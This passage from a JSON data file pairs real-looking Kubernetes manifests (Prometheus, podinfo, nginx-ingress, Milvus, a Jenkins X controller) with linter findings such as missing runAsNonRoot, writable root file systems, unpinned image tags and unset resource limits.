    "policy_id": "latest-tag",
    "violation_text": "The container \"node\" is using an invalid container image, \"loomnetwork/loom\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10006",
    "manifest_path": "data/manifests/the_stack_sample/sample_3851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loom-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dappchain\n  template:\n    metadata:\n      labels:\n        app: dappchain\n    spec:\n      containers:\n      - name: node\n        image: loomnetwork/loom\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node\" does not have a read-only root file system"
  },
  {
    "id": "10007",
    "manifest_path": "data/manifests/the_stack_sample/sample_3851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loom-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dappchain\n  template:\n    metadata:\n      labels:\n        app: dappchain\n    spec:\n      containers:\n      - name: node\n        image: loomnetwork/loom\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node\" is not set to runAsNonRoot"
  },
  {
    "id": "10008",
    "manifest_path": "data/manifests/the_stack_sample/sample_3851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loom-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dappchain\n  template:\n    metadata:\n      labels:\n        app: dappchain\n    spec:\n      containers:\n      - name: node\n        image: loomnetwork/loom\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node\" has cpu request 0"
  },
  {
    "id": "10009",
    "manifest_path": "data/manifests/the_stack_sample/sample_3851.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loom-deploy\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dappchain\n  template:\n    metadata:\n      labels:\n        app: dappchain\n    spec:\n      containers:\n      - name: node\n        image: loomnetwork/loom\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node\" has memory limit 0"
  },
  {
    "id": "10010",
    "manifest_path": "data/manifests/the_stack_sample/sample_3852.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dependant-app\n  labels:\n    app: dependant-app\nspec:\n  containers:\n  - name: dependante-app\n    image: dependant-app:0.1\n    env:\n    - name: SAMPLE_APP\n      value: http://sample-app:8081\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dependante-app\" does not have a read-only root file system"
  },
  {
    "id": "10011",
    "manifest_path": "data/manifests/the_stack_sample/sample_3852.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dependant-app\n  labels:\n    app: dependant-app\nspec:\n  containers:\n  - name: dependante-app\n    image: dependant-app:0.1\n    env:\n    - name: SAMPLE_APP\n      value: http://sample-app:8081\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dependante-app\" is not set to runAsNonRoot"
  },
  {
    "id": "10012",
    "manifest_path": "data/manifests/the_stack_sample/sample_3852.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dependant-app\n  labels:\n    app: dependant-app\nspec:\n  containers:\n  - name: dependante-app\n    image: dependant-app:0.1\n    env:\n    - name: SAMPLE_APP\n      value: http://sample-app:8081\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dependante-app\" has cpu request 0"
  },
  {
    "id": "10013",
    "manifest_path": "data/manifests/the_stack_sample/sample_3852.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dependant-app\n  labels:\n    app: dependant-app\nspec:\n  containers:\n  - name: dependante-app\n    image: dependant-app:0.1\n    env:\n    - name: SAMPLE_APP\n      value: http://sample-app:8081\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dependante-app\" has memory limit 0"
  },
  {
    "id": "10014",
    "manifest_path": "data/manifests/the_stack_sample/sample_3855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus-deployment\n  namespace: monitoring\n  labels:\n    app: prometheus-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus-server\n  template:\n    metadata:\n      labels:\n        app: prometheus-server\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --config.file=/etc/prometheus/prometheus.yml\n        - --storage.tsdb.path=/prometheus/\n        ports:\n        - containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus/\n        - name: prometheus-storage-volume\n          mountPath: /prometheus/\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-server-conf\n      - name: prometheus-storage-volume\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"prometheus\" is using an invalid container image, \"prom/prometheus\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10015",
    "manifest_path": "data/manifests/the_stack_sample/sample_3855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus-deployment\n  namespace: monitoring\n  labels:\n    app: prometheus-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus-server\n  template:\n    metadata:\n      labels:\n        app: prometheus-server\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --config.file=/etc/prometheus/prometheus.yml\n        - --storage.tsdb.path=/prometheus/\n        ports:\n        - containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus/\n        - name: prometheus-storage-volume\n          mountPath: /prometheus/\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-server-conf\n      - name: prometheus-storage-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus\" does not have a read-only root file system"
  },
  {
    "id": "10016",
    "manifest_path": "data/manifests/the_stack_sample/sample_3855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus-deployment\n  namespace: monitoring\n  labels:\n    app: prometheus-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus-server\n  template:\n    metadata:\n      labels:\n        app: prometheus-server\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --config.file=/etc/prometheus/prometheus.yml\n        - --storage.tsdb.path=/prometheus/\n        ports:\n        - containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus/\n        - name: prometheus-storage-volume\n          mountPath: /prometheus/\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-server-conf\n      - name: prometheus-storage-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus\" is not set to runAsNonRoot"
  },
  {
    "id": "10017",
    "manifest_path": "data/manifests/the_stack_sample/sample_3855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus-deployment\n  namespace: monitoring\n  labels:\n    app: prometheus-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus-server\n  template:\n    metadata:\n      labels:\n        app: prometheus-server\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --config.file=/etc/prometheus/prometheus.yml\n        - --storage.tsdb.path=/prometheus/\n        ports:\n        - containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus/\n        - name: prometheus-storage-volume\n          mountPath: /prometheus/\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-server-conf\n      - name: prometheus-storage-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus\" has cpu request 0"
  },
  {
    "id": "10018",
    "manifest_path": "data/manifests/the_stack_sample/sample_3855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus-deployment\n  namespace: monitoring\n  labels:\n    app: prometheus-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus-server\n  template:\n    metadata:\n      labels:\n        app: prometheus-server\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --config.file=/etc/prometheus/prometheus.yml\n        - --storage.tsdb.path=/prometheus/\n        ports:\n        - containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus/\n        - name: prometheus-storage-volume\n          mountPath: /prometheus/\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-server-conf\n      - name: prometheus-storage-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus\" has memory limit 0"
  },
  {
    "id": "10019",
    "manifest_path": "data/manifests/the_stack_sample/sample_3856.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: users\n  name: users\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: users\n  template:\n    metadata:\n      labels:\n        io.kompose.service: users\n    spec:\n      containers:\n      - image: ${AWS_ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/cinema-1:users\n        name: users\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"users\" does not have a read-only root file system"
  },
  {
    "id": "10020",
    "manifest_path": "data/manifests/the_stack_sample/sample_3856.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: users\n  name: users\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: users\n  template:\n    metadata:\n      labels:\n        io.kompose.service: users\n    spec:\n      containers:\n      - image: ${AWS_ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/cinema-1:users\n        name: users\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"users\" is not set to runAsNonRoot"
  },
  {
    "id": "10021",
    "manifest_path": "data/manifests/the_stack_sample/sample_3856.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: users\n  name: users\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: users\n  template:\n    metadata:\n      labels:\n        io.kompose.service: users\n    spec:\n      containers:\n      - image: ${AWS_ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/cinema-1:users\n        name: users\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"users\" has cpu request 0"
  },
  {
    "id": "10022",
    "manifest_path": "data/manifests/the_stack_sample/sample_3856.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: users\n  name: users\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.kompose.service: users\n  template:\n    metadata:\n      labels:\n        io.kompose.service: users\n    spec:\n      containers:\n      - image: ${AWS_ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com/cinema-1:users\n        name: users\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"users\" has memory limit 0"
  },
  {
    "id": "10023",
    "manifest_path": "data/manifests/the_stack_sample/sample_3857.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: milvus\n    componet: test-env\nspec:\n  containers:\n  - name: milvus-test-env\n    image: registry.zilliz.com/milvus/milvus-test-env:v0.2\n    command:\n    - cat\n    resources:\n      limits:\n        memory: 8Gi\n        cpu: '4.0'\n      requests:\n        memory: 4Gi\n        cpu: '2.0'\n    volumeMounts:\n    - name: kubeconf\n      mountPath: /root/.kube/\n      readOnly: true\n  volumes:\n  - name: kubeconf\n    secret:\n      secretName: test-cluster-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"milvus-test-env\" does not have a read-only root file system"
  },
  {
    "id": "10024",
    "manifest_path": "data/manifests/the_stack_sample/sample_3857.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: milvus\n    componet: test-env\nspec:\n  containers:\n  - name: milvus-test-env\n    image: registry.zilliz.com/milvus/milvus-test-env:v0.2\n    command:\n    - cat\n    resources:\n      limits:\n        memory: 8Gi\n        cpu: '4.0'\n      requests:\n        memory: 4Gi\n        cpu: '2.0'\n    volumeMounts:\n    - name: kubeconf\n      mountPath: /root/.kube/\n      readOnly: true\n  volumes:\n  - name: kubeconf\n    secret:\n      secretName: test-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"milvus-test-env\" is not set to runAsNonRoot"
  },
  {
    "id": "10025",
    "manifest_path": "data/manifests/the_stack_sample/sample_3858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfod\n        image: ghcr.io/stecky/podinfo:5.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "10026",
    "manifest_path": "data/manifests/the_stack_sample/sample_3858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfod\n        image: ghcr.io/stecky/podinfo:5.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "10027",
    "manifest_path": "data/manifests/the_stack_sample/sample_3859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.5.4\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 67c776bf82621e022317a40d90de6ff011c91691631856781119358c252609d4\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.5.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.34.71.64.216.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.4\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 900a072af58c65599b02e3098cbb4d3136000c97\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-tekton-controller\" does not have a read-only root file system"
  },
  {
    "id": "10028",
    "manifest_path": "data/manifests/the_stack_sample/sample_3859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.5.4\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 67c776bf82621e022317a40d90de6ff011c91691631856781119358c252609d4\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.5.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.34.71.64.216.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.4\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 900a072af58c65599b02e3098cbb4d3136000c97\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-tekton-controller\" not found"
  },
  {
    "id": "10029",
    "manifest_path": "data/manifests/the_stack_sample/sample_3859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.5.4\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 67c776bf82621e022317a40d90de6ff011c91691631856781119358c252609d4\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.5.4\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.34.71.64.216.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.4\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 900a072af58c65599b02e3098cbb4d3136000c97\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-tekton-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "10030",
    "manifest_path": "data/manifests/the_stack_sample/sample_3860.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: nginx-ingress-lb\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 18080\n          hostPort: 18080\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=kube-system/default-http-backend\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"nginx-ingress-lb\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "10031",
    "manifest_path": "data/manifests/the_stack_sample/sample_3860.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: nginx-ingress-lb\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 18080\n          hostPort: 18080\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=kube-system/default-http-backend\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "10032",
    "manifest_path": "data/manifests/the_stack_sample/sample_3860.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: nginx-ingress-lb\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 18080\n          hostPort: 18080\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=kube-system/default-http-backend\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "10033",
    "manifest_path": "data/manifests/the_stack_sample/sample_3860.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: nginx-ingress-lb\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 18080\n          hostPort: 18080\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=kube-system/default-http-backend\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has cpu request 0"
  },
  {
    "id": "10034",
    "manifest_path": "data/manifests/the_stack_sample/sample_3860.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        name: nginx-ingress-lb\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 18080\n          hostPort: 18080\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=kube-system/default-http-backend\n",
    "policy_id": "unset-memory-requirements",
